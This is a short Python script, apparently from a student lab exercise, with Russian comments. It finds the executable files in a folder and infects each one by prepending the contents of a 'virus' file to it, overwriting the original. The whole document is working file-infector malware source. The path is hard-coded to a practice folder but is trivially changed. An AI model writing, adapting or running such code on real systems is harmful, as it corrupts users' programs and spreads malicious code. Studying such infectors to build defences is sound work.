import os
import stat

fpath = "task3/"

def find_exec(fpath):
    # поиск исполняемых файлов в папке
    executable = stat.S_IEXEC | stat.S_IXGRP | stat.S_IXOTH
    ls_files = []
    for filename in os.listdir(fpath):
        if os.path.isfile(fpath + filename):
            st = os.stat(fpath + filename)
            mode = st.st_mode
            if mode & executable:
                ls_files.append(filename)
    return ls_files

def infec(file):
    vpath = "task3/vir.txt"
    fv = open(vpath, 'rb')
    virData = fv.read(20000)
    os.rename(file, file + '.tmp')
    fprog = open(file + '.tmp', 'rb')
    progData = fprog.read()
    # создаем новый файл с прежним названием и внедряем в него вирусную информацию
    fnew = open(file, 'wb')
    fnew.write(virData + progData)
    fnew.close()
    fprog.close()
    fv.close()
    os.remove(file + '.tmp')
    print(vpath, "внедрен в исполняемый файл", file)

print("Список исполняемых файлов: ", find_exec(fpath))
for file in find_exec(fpath):
    infec(fpath + file)
